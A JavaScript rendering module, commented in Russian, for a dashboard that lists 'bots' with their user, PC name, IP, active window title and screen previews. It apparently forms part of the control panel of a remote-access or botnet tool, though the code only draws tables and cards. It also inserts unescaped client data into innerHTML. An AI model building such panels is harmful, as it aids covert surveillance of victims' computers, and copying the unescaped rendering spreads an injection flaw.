/* frontend/dashboard/js/modules/ui/renderer.js */

const getFlag = (l) => (!l || l.length !== 2) ? '🏳️' : l.toUpperCase().replace(/./g, c => String.fromCodePoint(c.charCodeAt(0) + 127397));

let isGridView = false;
// Увеличили до 35, чтобы гарантированно вызвать скролл в сетке
const MIN_SKELETONS = 35;

export const Renderer = {
    getIsGridView: () => isGridView,

    toggleView() {
        isGridView = !isGridView;
        const btn = document.getElementById('toggleView');
        if (btn) btn.innerHTML = isGridView ? '<i class="fas fa-list"></i> Table' : '<i class="fas fa-th"></i> Grid';
        return isGridView;
    },

    // Шаблон реальной строки таблицы
    _getRowTemplate(c) {
        return `
            <td>
                <div class="status-wrapper">
                    <span class="status-dot-mini ${c.status}"></span> 
                    ${getFlag(c.loc)}
                </div>
            </td>
            <td><span class="cell-content">${c.user || '—'}</span></td>
            <td><span class="cell-content">${c.pc_name || '—'}</span></td>
            <td><span class="cell-content">${c.last_active || '—'}</span></td>
            <td><span class="cell-content">${c.ip || '—'}</span></td>
            <td><span class="cell-content" title="${c.active_window || ''}">${c.active_window || '—'}</span></td>
            <td><span class="cell-content client-id-cell">${c.id}</span></td>
        `;
    },

    // Шаблон скелетной строки таблицы
    _getSkeletonRow() {
        return `
            <tr class="skeleton-row">
                <td><div class="skeleton-dot"></div></td>
                <td><div class="skeleton-line"></div></td>
                <td><div class="skeleton-line"></div></td>
                <td><div class="skeleton-line"></div></td>
                <td><div class="skeleton-line"></div></td>
                <td><div class="skeleton-line"></div></td>
                <td><div class="skeleton-line"></div></td>
            </tr>
        `;
    },

    // Шаблон скелетной карточки для сетки
    _getSkeletonCard() {
        return `
            <div class="client-card skeleton-card">
                <div class="bot-preview skeleton-pulse"></div>
                <div class="bot-card-body">
                    <div class="skeleton-line" style="width: 80%; height: 12px; margin: 5px 0;"></div>
                    <div class="skeleton-line" style="width: 50%; height: 10px; opacity: 0.5;"></div>
                </div>
            </div>
        `;
    },

    render(list) {
        const [tc, gc] = [document.getElementById('table-container'), document.getElementById('grid-view')];
        if (!tc || !gc) return;

        tc.classList.toggle('hidden', isGridView);
        gc.classList.toggle('hidden', !isGridView);

        // В сетке фильтруем оффлайн, в таблице оставляем всех
        const displayList = isGridView ? list.filter(c => c.status === 'online') : list;
        
        isGridView ? this.drawGrid(displayList, gc) : this.drawTable(displayList);
    },

    drawTable(list) {
        const tbody = document.getElementById('clients-list');
        if (!tbody) return;

        tbody.innerHTML = ''; 

        // 1. Рисуем реальных ботов
        list.forEach((bot) => {
            const row = document.createElement('tr');
            row.className = `client-row ${bot.status}`;
            row.dataset.clientId = bot.id;
            row.innerHTML = this._getRowTemplate(bot);
            tbody.appendChild(row);
        });

        // 2. Добиваем скелетами (минимум 35 строк)
        const skeletonsNeeded = Math.max(0, MIN_SKELETONS - list.length);
        for (let i = 0; i < skeletonsNeeded; i++) {
            tbody.insertAdjacentHTML('beforeend', this._getSkeletonRow());
        }
    },

    drawGrid(list, cont) {
        cont.innerHTML = '';

        // 1. Реальные карточки (Online)
        const realCards = list.map(c => `
            <div class="client-card ${c.status}" data-client-id="${c.id}">
                <div class="bot-preview">
                    <img src="${c.lastPreview || '../images/test2.jpg'}" id="prev-${c.id}">
                </div>
                <div class="bot-card-body">
                    <div class="bot-info-row">
                        <span class="flag-emoji">${getFlag(c.loc)}</span>
                        <div class="bot-data-string">
                             <span>${c.ip || '0.0.0.0'}</span>
                             <span class="data-separator">|</span>
                             <span class="data-part-id">${c.id}</span>
                        </div>
                    </div>
                </div>
            </div>`).join('');

        // 2. Скелеты (минимум 35 карточек)
        const skeletonsNeeded = Math.max(0, MIN_SKELETONS - list.length);
        let skeletonCards = '';
        for (let i = 0; i < skeletonsNeeded; i++) {
            skeletonCards += this._getSkeletonCard();
        }

        cont.innerHTML = realCards + skeletonCards;
    }
};